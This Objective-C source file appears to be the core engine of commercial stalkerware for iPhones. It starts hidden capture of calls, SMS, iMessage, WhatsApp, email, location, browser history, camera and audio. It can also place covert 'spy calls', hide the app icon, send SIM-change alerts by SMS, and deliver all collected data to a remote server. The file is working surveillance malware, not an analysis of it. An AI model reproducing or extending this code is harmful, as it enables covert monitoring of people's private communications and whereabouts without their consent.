//
//  AppEngine.m
//  AppEngine
//
//  Created by Makara Khloth on 11/17/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "AppEngine.h"
#import "AppEngineUICmd.h"
#import "Product.h"

// Components headers
#import "ComponentHeaders.h"

// Utils
#import "ServerErrorStatusHandler.h"
#import "PreferencesChangeHandler.h"
#import "MessagePortIPCSender.h"

// Sts
#import "DefStd.h"



@interface AppEngine (private)
- (void) createApplicationEngine;
- (void) createApplicationFeatures;
- (void) destructApplicationFeatures;
- (EventQueryPriority*) eventQueryPriority;
- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo;
@end

@implementation AppEngine

// Engine
@synthesize mApplicationContext;
@synthesize mSystemUtils;
@synthesize mSMSSendManager;
@synthesize mLicenseManager;
@synthesize mConfigurationManager;
@synthesize mServerAddressManager;
@synthesize mConnectionHistoryManager;
@synthesize mPreferenceManager;
@synthesize mCSM;
@synthesize mDDM;
@synthesize mActivationManager;
@synthesize mERM;
@synthesize mEDM;
@synthesize mEventCenter;
@synthesize mRemoteCmdManager;
@synthesize mSIMChangeManager;
@synthesize mActivationCodeCaptureManager;

// Features
@synthesize mCallLogCaptureManager;
@synthesize mSMSCaptureManager;
@synthesize mIMessageCaptureManager;
@synthesize mMMSCaptureManager;
@synthesize mMailCaptureManager;
@synthesize mLocationManager;
@synthesize mAddressbookManager;
@synthesize mMediaFinder;
@synthesize mMediaCaptureManager;
@synthesize mSpyCallManager;
@synthesize mAppAgentManager;
@synthesize mWhatsAppCaptureManager;
@synthesize mBrowserUrlCaptureManager;

// Flags
@synthesize mIsRestartingAppEngine;
@synthesize mIsNeedSendSMSHomeNumbers;

- (id) init {
	if ((self = [super init])) {
		[self createApplicationEngine];
	}
	return (self);
}

// From license manager
- (void) onLicenseChanged:(LicenseInfo *)licenseInfo {
	APPLOGVERBOSE(@"--->Enter<---");
	@try {
		[self doLicenseChanged:licenseInfo];
	}
	@catch (NSException *e) {
		DLog(@"License changed NSException: %@", [e description])
	}
	@catch (FxException *e) {
		DLog(@"License changed FxException: %@, cate: %d, code: %d, excName: %@, excReason: %@", [e description], [e errorCategory], [e errorCode], [e excName], [e excReason])
	}
	@finally {
		[self setMIsRestartingAppEngine:FALSE];
	}
	APPLOGVERBOSE(@"--->End<---");
}

// From activation code capture
- (void) activationCodeDidReceived: (NSString*) aActivationCode {
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	[visibility launchApplication];
}

// From server address manager
- (void) serverAddressChanged {
	[mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
}

- (void) createApplicationEngine {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Contruct engine")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	// Home private and shared directory
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	NSString *sharedHome = [DaemonPrivateHome daemonSharedHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sharedHome];
	NSString *command = [NSString stringWithFormat:@"chmod 777 %@", sharedHome];
	system([command cStringUsingEncoding:NSUTF8StringEncoding]);
	
	// Telephony notification manager
	mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] initAndStartListeningToTelephonyNotification];
	
	// App context
	NSData *productCipher = [NSData dataWithBytes:kProductInfoCipher length:(sizeof(kProductInfoCipher)/sizeof(unsigned char))];
	mApplicationContext = [[AppContextImp alloc] initWithProductCipher:productCipher];
	
	// System utils
	mSystemUtils = [[SystemUtilsImpl alloc] init];
	
	// SMS sender
	mSMSSendManager = [[SMSSendManager alloc] init];
	
	// License manager
	mLicenseManager = [[LicenseManager alloc] initWithAppContext:mApplicationContext];
	[mLicenseManager addLicenseChangeListener:self];
	
	// Configuration manager
	mConfigurationManager = [[ConfigurationManagerImpl alloc] init];
	[mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
	
	// Server URL
	mServerAddressManager = [[ServerAddressManagerImp alloc] initWithServerAddressChangeDelegate:self];
	[mServerAddressManager setRequireBaseServerUrl:TRUE];
	
	// Connection history
	mConnectionHistoryManager = [[ConnectionHistoryManagerImp alloc] init];
	[mConnectionHistoryManager setMMaxConnectionCount:5];
	
	// Preferences
	mPreferenceManager = [[PreferenceManagerImpl alloc] init];
	
	// CSM
	NSString *payloadPath = [privateHome stringByAppendingString:@"csm/payload/"];
	NSString *sessionPath = [privateHome stringByAppendingString:@"csm/dbsession/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:payloadPath];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:sessionPath];
	mCSM = [CommandServiceManager sharedManagerWithPayloadPath:payloadPath withDBPath:sessionPath];
	[mCSM setStructuredURL:[NSURL URLWithString:[mServerAddressManager getStructuredServerUrl]]];
	[mCSM setUnstructuredURL:[NSURL URLWithString:[mServerAddressManager getUnstructuredServerUrl]]];
	
	// DDM
	mDDM = [[DataDeliveryManager alloc] initWithCSM:mCSM];
	[mDDM setMAppContext:mApplicationContext];
	[mDDM setMLicenseManager:mLicenseManager];
	[mDDM setMServerAddressManager:mServerAddressManager];
	[mDDM setMConnectionHistory:mConnectionHistoryManager];
	
	// Activation manager
	mActivationManager = [[ActivationManager alloc] initWithDataDelivery:mDDM withAppContext:mApplicationContext andLicenseManager:mLicenseManager];
	[mActivationManager setMServerAddressManager:mServerAddressManager];

	// Event repository
	mERM = [[EventRepositoryManager alloc] initWithEventQueryPriority:[self eventQueryPriority]];
	[mERM openRepository];
	//[mERM deleteRepository];
	
	// EDM
	mEDM = [[EventDeliveryManager alloc] initWithEventRepository:mERM andDataDelivery:mDDM];
	 
	// Event center
	mEventCenter = [[EventCenter alloc] initWithEventRepository:mERM];
	
	// RCM
	NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
	mRemoteCmdManager = [[RemoteCmdManagerImpl alloc] init];
	[mDDM setMRemoteCommand:[mRemoteCmdManager mPCCCmdCenter]];
	[mRemoteCmdManager setMSMSSender:mSMSSendManager];
	[mRemoteCmdManager setMServerAddressManager:mServerAddressManager];
	[mRemoteCmdManager setMEventDelegate:mEventCenter];
	[mRemoteCmdManager setMLicenseManager:mLicenseManager];
	[mRemoteCmdManager setMDataDelivery:mDDM];
	[mRemoteCmdManager setMEventDelivery:mEDM];
	[mRemoteCmdManager setMAppContext:mApplicationContext];
	[mRemoteCmdManager setMPreferenceManager:mPreferenceManager];
	[mRemoteCmdManager setMActivationManagerProtocol:mActivationManager];
	[mRemoteCmdManager setMSupportCmdCodes:[mConfigurationManager mSupportedRemoteCmdCodes]];
	[mRemoteCmdManager setMSystemUtils:mSystemUtils];
	[mRemoteCmdManager setMEventRepository:mERM];
	[mRemoteCmdManager setMConnectionHistoryManager:mConnectionHistoryManager];
	[mRemoteCmdManager setMConfigurationManager:mConfigurationManager];
	[mRemoteCmdManager setMMediaSearchPath:mediaFoundPath];
	[mRemoteCmdManager launch];

	// SIM change
	mSIMChangeManager = [[SIMCaptureManagerImpl alloc] initWithTelephonyNotificationManager:mTelephonyNotificationManagerImpl];
	[mSIMChangeManager setMSMSSender:mSMSSendManager];
	[mSIMChangeManager setMEventDelegate:mEventCenter];
	[mSIMChangeManager setMAppContext:mApplicationContext];
	[mSIMChangeManager setMLicenseManager:mLicenseManager];
	
	// Activation code capture
	mActivationCodeCaptureManager = [[ActivationCodeCaptureManager alloc] initWithTelephonyNotification:mTelephonyNotificationManagerImpl andDelegate:self];
	[mActivationCodeCaptureManager startCaptureActivationCode];
	
	// Utils
	mServerErrorStatusHandler = [[ServerErrorStatusHandler alloc] init];
	[mServerErrorStatusHandler setMLicenseManager:mLicenseManager];
	[mServerErrorStatusHandler setMAppEngine:self];
	[mDDM setMServerStatusErrorListener:mServerErrorStatusHandler];
	mPreferencesChangeHandler = [[PreferencesChangeHandler alloc] initWithAppEngine:self];
	[mPreferenceManager addPreferenceChangeListener:mPreferencesChangeHandler];

	// Connection to UI
	mAppEngineConnection = [[AppEngineConnection alloc] initWithAppEngine:self];
	
	// Start-up time
	PrefStartupTime *prefStartupTime = (PrefStartupTime *)[mPreferenceManager preference:kStartup_Time];
	[prefStartupTime setMStartupTime:[DateTimeFormat phoenixDateTime]];
	[mPreferenceManager savePreference:prefStartupTime];
	
	// Set flag for engine just starting
	[self setMIsRestartingAppEngine:TRUE];
}

- (void) createApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Contruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	PrefEventsCapture *prefEventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
	PrefLocation *prefLocation = (PrefLocation *)[mPreferenceManager preference:kLocation];
	PrefKeyword *prefKeyword = (PrefKeyword *)[mPreferenceManager preference:kKeyword];
	PrefMonitorNumber* prefMonitorNumbers = (PrefMonitorNumber *)[mPreferenceManager preference:kMonitor_Number];
	PrefHomeNumber* prefHomeNumbers = (PrefHomeNumber *)[mPreferenceManager preference:kHome_Number];
	PrefVisibility *prefVisibility = (PrefVisibility  *)[mPreferenceManager preference:kVisibility];
	PrefRestriction *prefRestriction = (PrefRestriction *)[mPreferenceManager preference:kRestriction];
	
	[mEDM setMaximumEvent:[prefEventCapture mMaxEvent]];
	[mEDM setDeliveryTimer:[prefEventCapture mDeliverTimer]];
	
	// Call log
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
		if (!mCallLogCaptureManager) {
			mCallLogCaptureManager = [[CallLogCaptureManager alloc] initWithEventDelegate:mEventCenter andTelephonyNotificationCenter:mTelephonyNotificationManagerImpl];
			[mCallLogCaptureManager setMAC:[NSString stringWithFormat:@"*#%@", [[mLicenseManager mCurrentLicenseInfo] activationCode]]];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCallLog]) {
			[mCallLogCaptureManager startCapture];
		} else {
			[mCallLogCaptureManager stopCapture];
		}
	}
	
	// SMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		if (!mSMSCaptureManager) {
			mSMSCaptureManager = [[SMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			[mSMSCaptureManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableSMS]) {
			[mSMSCaptureManager startCapture];
		} else {
			[mSMSCaptureManager stopCapture];
		}
	}
	
	// IMessage/WhatsApp
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventIM]) {
		if (!mIMessageCaptureManager) {
			mIMessageCaptureManager = [[IMessageCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if(!mWhatsAppCaptureManager) {
		   mWhatsAppCaptureManager=[[WhatsAppCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableIM]) {
			[mIMessageCaptureManager startCapture];
			[mWhatsAppCaptureManager startCapture];
		} else {
			[mIMessageCaptureManager stopCapture];
			[mWhatsAppCaptureManager stopCapture];
		}
	}
	
	// MMS
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		if (!mMMSCaptureManager) {
			mMMSCaptureManager = [[MMSCaptureManager alloc] initWithEventDelegate:mEventCenter];
			NSString* mmsAttachmentPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"attachments/mms/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mmsAttachmentPath];
			[mMMSCaptureManager setMMMSAttachmentPath:mmsAttachmentPath];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableMMS]) {
			[mMMSCaptureManager startCapture];
		} else {
			[mMMSCaptureManager stopCapture];
		}
	}
	
	// Email
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		if (!mMailCaptureManager) {
			mMailCaptureManager = [[MailCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableEmail]) {
			[mMailCaptureManager startMonitoring];
		} else {
			[mMailCaptureManager stopMonitoring];
		}
	}
	
	// Location
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		if (!mLocationManager) {
			mLocationManager = [[LocationManagerImpl alloc] init];
			[mLocationManager setMIntervalTime:[prefLocation mLocationInterval]];
			[mLocationManager setEventDelegate:mEventCenter];
			[mLocationManager setMAppContext:mApplicationContext];
		}
		if ([prefEventCapture mStartCapture] && [prefLocation mEnableLocation]) {
			 [mLocationManager startTracking];
		} else {
			 [mLocationManager stopTracking];
		}
	}
	
	// Address book
	if ([mConfigurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
		if (!mAddressbookManager) {
			mAddressbookManager = [[AddressbookManagerImp alloc] initWithDataDeliveryManager:mDDM];
			[mRemoteCmdManager setMAddressbookManager:mAddressbookManager];
			[mRemoteCmdManager relaunchForFeaturesChange];
		}
		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
			[mAddressbookManager setMode:kAddressbookManagerModeOff];
			[mAddressbookManager stop];
		} else {
			[mAddressbookManager setMode:kAddressbookManagerModeMonitor];
			[mAddressbookManager start];
		}
	}
	
	// Media finder
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		if (!mMediaFinder) {
			NSString* mediaFoundPath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/search/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaFoundPath];
			mMediaFinder = [[MediaFinder alloc] initWithEventDelegate:mEventCenter andMediaPath:mediaFoundPath];
		}
		
		NSMutableArray *entries = [NSMutableArray array];
		// Image
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaImage)) { // Not search yet
			[MediaFinder setImageFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaImage];
			[mPreferenceManager savePreference:prefEventCapture];
		}

		// Video
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaVideo)) { // Not search yet
			[MediaFinder setVideoFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaVideo];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		// Audio
		if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile] &&
			!([prefEventCapture mSearchMediaFilesFlags] & kSearchMediaAudio)) { // Not search yet
			[MediaFinder setAudioFindEntry:entries];
			[prefEventCapture setMSearchMediaFilesFlags:[prefEventCapture mSearchMediaFilesFlags] | kSearchMediaAudio];
			[mPreferenceManager savePreference:prefEventCapture];
		}
		if ([entries count]) {
			[mMediaFinder findMediaFileWithExtMime:entries];
		}
	}
	
	// Media capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
		if (!mMediaCaptureManager) {
			NSString* mediaCapturePath = [[DaemonPrivateHome daemonPrivateHome] stringByAppendingString:@"media/capture/thumbnails/"];
			[DaemonPrivateHome createDirectoryAndIntermediateDirectories:mediaCapturePath];
			mMediaCaptureManager = [[MediaCaptureManager alloc] initWithEventDelegate:mEventCenter andThumbnailDirectoryPath:mediaCapturePath];
		}
		
		// Camera
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCameraImage]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableCameraImage]) {
				[mMediaCaptureManager startCameraImageCapture];
			} else {
				[mMediaCaptureManager stopCameraImageCapture];
			}
		}
		// Video
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventVideoRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableVideoFile]) {
				[mMediaCaptureManager startVideoCapture];
			} else {
				[mMediaCaptureManager stopVideoCapture];
			}
		}
		// Audio
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventSoundRecording]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableAudioFile]) {
				[mMediaCaptureManager startAudioCapture];
			} else {
				[mMediaCaptureManager stopAudioCapture];
			}
		}
		// Wallpaper
		if ([mConfigurationManager isSupportedFeature:kFeatureID_EventWallpaper]) {
			if ([prefEventCapture mStartCapture] && [prefEventCapture mEnableWallPaper]) {
				[mMediaCaptureManager startWallPaperCapture];
			} else {
				[mMediaCaptureManager stopWallPaperCapture];
			}
		}
	}
	
	// Browser url/Bookmark capture
	if ([mConfigurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		if (!mBrowserUrlCaptureManager) {
			mBrowserUrlCaptureManager = [[BrowserUrlCaptureManager alloc] initWithEventDelegate:mEventCenter];
		}
		if ([prefEventCapture mStartCapture]) {
			if ([prefEventCapture mEnableBrowserUrl]) {
				[mBrowserUrlCaptureManager startBrowserUrlCapture];
			}
		} else {
			[mBrowserUrlCaptureManager stopBrowserUrlCapture];
		}
	}
	
	// Spy call
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SpyCall] ||
		[mConfigurationManager isSupportedFeature:kFeatureID_OnDemandConference]) {
		mSpyCallManager = [[SpyCallManager alloc] init];
		[mSpyCallManager setMSMSSender:mSMSSendManager];
		[mSpyCallManager setMPreferenceManager:mPreferenceManager];
		if ([[mLicenseManager mCurrentLicenseInfo] licenseStatus] != EXPIRED &&
			[[mLicenseManager mCurrentLicenseInfo] licenseStatus] != DISABLE) {
			if ([prefMonitorNumbers mEnableMonitor]) {
				[mSpyCallManager start];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:[prefMonitorNumbers mMonitorNumbers]];
				}
			} else {
				[mSpyCallManager stop];
				// Not capture monitor numbers (suppose call log capture is allocated)
				if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
					[mCallLogCaptureManager setMNotCaptureNumbers:nil];
				}
			}
		} else {
			[mSpyCallManager stop];
			// Not capture monitor numbers (suppose call log capture is allocated)
			if ([mConfigurationManager isSupportedFeature:kFeatureID_EventCall]) {
				[mCallLogCaptureManager setMNotCaptureNumbers:nil];
			}
		}
	}

	// Keyword
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SMSKeyword]) {
		NSData *keywordData = [prefKeyword toData];
		SharedFileIPC *sharedFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
		[sharedFileIPC writeData:keywordData withID:kSharedFileKeywordID];
		[sharedFileIPC release];
	}
	
	// Visibility
	if ([mConfigurationManager isSupportedFeature:kFeatureID_HideApplication]) {
		id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
		if ([prefVisibility mVisible]) {
			[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
		} else {
			[visibility hideIconFromAppSwitcherIcon:YES andDesktop:YES];
		}
	}
	
	// SIM change notification
	if ([mConfigurationManager isSupportedFeature:kFeatureID_SIMChange]) {
		// 1. Home numbers
		NSString *notificationString = [[mApplicationContext mProductInfo] notificationStringForCommand:kNotificationSIMChangeCommandID
																				  withActivationCode:[[mLicenseManager mCurrentLicenseInfo] activationCode]
																							 withArg:nil];
		[mSIMChangeManager startReportSIMChange:notificationString andRecipients:[prefHomeNumbers mHomeNumbers]];
		// 2. Monitor numbers
		notificationString = NSLocalizedString (@"kSIMChange2MonitorNumbers", @"");
		[mSIMChangeManager startListenToSIMChange:notificationString andRecipients:[prefMonitorNumbers mMonitorNumbers]];
	}
	
	// App agent
	if (!mAppAgentManager) {
		mAppAgentManager = [[AppAgentManager alloc] initWithEventDelegate:mEventCenter];
	}
	[mAppAgentManager startListenMemoryWarningLevel];
	[mAppAgentManager startListenDiskSpaceWarningLevel];
	[mAppAgentManager startHandleUncaughtException];
	[mAppAgentManager startListenSystemPowerAndWakeIphone];
	
	// Resume all pending commands
	if ([self mIsRestartingAppEngine]) {
		// Application just restart from either crash or phone restart
		[mRemoteCmdManager processPendingRemoteCommands];
	} else {
		// Application have been activated by user
		[self setMIsNeedSendSMSHomeNumbers:YES];
	}
}

- (void) destructApplicationFeatures {
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	DLog(@"Destruct features")
	DLog(@">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
	// Call
	[mCallLogCaptureManager release];
	mCallLogCaptureManager = nil;
	
	// SMS
	[mSMSCaptureManager release];
	mSMSCaptureManager = nil;
	
	// IMessage
	[mIMessageCaptureManager release];
	mIMessageCaptureManager = nil;
	
	//WhatsApp
	[mWhatsAppCaptureManager release];
	mWhatsAppCaptureManager=nil;
	
	// MMS
	[mMMSCaptureManager release];
	mMMSCaptureManager = nil;
	
	// Email
	[mMailCaptureManager release];
	mMailCaptureManager = nil;
	
	// Location
	[mLocationManager release];
	mLocationManager = nil;
	
	// Address book
	[mRemoteCmdManager setMAddressbookManager:nil];
	[mRemoteCmdManager relaunchForFeaturesChange];
	[mAddressbookManager release];
	mAddressbookManager = nil;
	
	// Media finder
	[mMediaFinder release];
	mMediaFinder = nil;
	
	// Media capture
	[mMediaCaptureManager release];
	mMediaCaptureManager = nil;
	
	// Borwser url/Bookmark capture
	[mBrowserUrlCaptureManager release];
	mBrowserUrlCaptureManager = nil;
	
	// Stop deliver
	[mEDM setDeliveryTimer:0];
	
	// Visibility
	id <AppVisibility> visibility = [mApplicationContext getAppVisibility];
	[visibility hideIconFromAppSwitcherIcon:NO andDesktop:NO];
	
	// SIM change notification
	[mSIMChangeManager stopReportSIMChange];
	[mSIMChangeManager stopListenToSIMChange];
	
	// Spy call manager
	[mSpyCallManager release];
	mSpyCallManager = nil;
	
	// App agent
	[mAppAgentManager release];
	mAppAgentManager = nil;
	
	[mPreferenceManager resetPreferences];
	
	// Remove all pending commands
	if (![self mIsRestartingAppEngine]) {
		// Application have been deactivated by user
		[mERM deleteRepository];
		[mRemoteCmdManager clearAllPendingRemoteCommands];
	} else {
		// Application just restarting from either crash or phone restart
	}
	[self setMIsNeedSendSMSHomeNumbers:NO];
}

- (EventQueryPriority*) eventQueryPriority {
	NSMutableArray* eventTypePriorityArray = [[NSMutableArray alloc] init];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanic]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypePanicImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSettings]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeLocation]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSystem]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallLog]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeSms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMms]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeMail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeIM]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBrowserURL]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeBookmark]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImage]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCameraImageThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideo]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeVideoThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudio]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeCallRecordAudioThumbnail]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaper]];
	[eventTypePriorityArray addObject:[NSNumber numberWithInt:kEventTypeWallpaperThumbnail]];
	EventQueryPriority* eventQueryPriority = [[EventQueryPriority alloc] initWithUserPriority:eventTypePriorityArray];
	[eventTypePriorityArray release];
	[eventQueryPriority autorelease];
	return (eventQueryPriority);
}

- (void) doLicenseChanged: (LicenseInfo*) aLicenseInfo {
	// Send license info to UI exclusively
	[mAppEngineConnection processCommand:kAppUI2EngineGetLicenseInfoCmd withCmdData:aLicenseInfo];
	[mConfigurationManager updateConfigurationID:[mLicenseManager getConfiguration]];
	Configuration *config = [mConfigurationManager configuration];
	[mRemoteCmdManager setMSupportCmdCodes:[config mSupportedRemoteCmdCodes]];
	[mActivationCodeCaptureManager setMAC:[aLicenseInfo activationCode]];
	
	if ([aLicenseInfo licenseStatus] == ACTIVATED ||
		[aLicenseInfo licenseStatus] == EXPIRED ||
		[aLicenseInfo licenseStatus] == DISABLE) {
		[self createApplicationFeatures];
	} else if ([aLicenseInfo licenseStatus] == DEACTIVATED) {
		[self destructApplicationFeatures];
	}
	
	[self setMIsRestartingAppEngine:FALSE];
}

- (void) dealloc {
	// Features
	[mBrowserUrlCaptureManager release];
	[mWhatsAppCaptureManager release];
	[mAppAgentManager release];
	[mSpyCallManager release];
	[mMediaCaptureManager release];
	[mMediaFinder release];
	[mAddressbookManager release];
	[mLocationManager release];
	[mMailCaptureManager release];
	[mMMSCaptureManager release];
	[mIMessageCaptureManager release];
	[mSMSCaptureManager release];
	[mCallLogCaptureManager release];
	
	// Engine
	[mActivationCodeCaptureManager release];
	[mSIMChangeManager release];
	[mRemoteCmdManager release];
	[mEventCenter release];
	[mEDM release];
	[mERM release];
	[mActivationManager release];
	[mDDM release];
	[mServerErrorStatusHandler release];
	[mCSM release];
	[mPreferenceManager release];
	[mConnectionHistoryManager release];
	[mServerAddressManager release];
	[mConfigurationManager release];
	[mLicenseManager release];
	[mSMSSendManager release];
	[mSystemUtils release];
	[mApplicationContext release];
	[mTelephonyNotificationManagerImpl release];
	[super dealloc];
}

@end
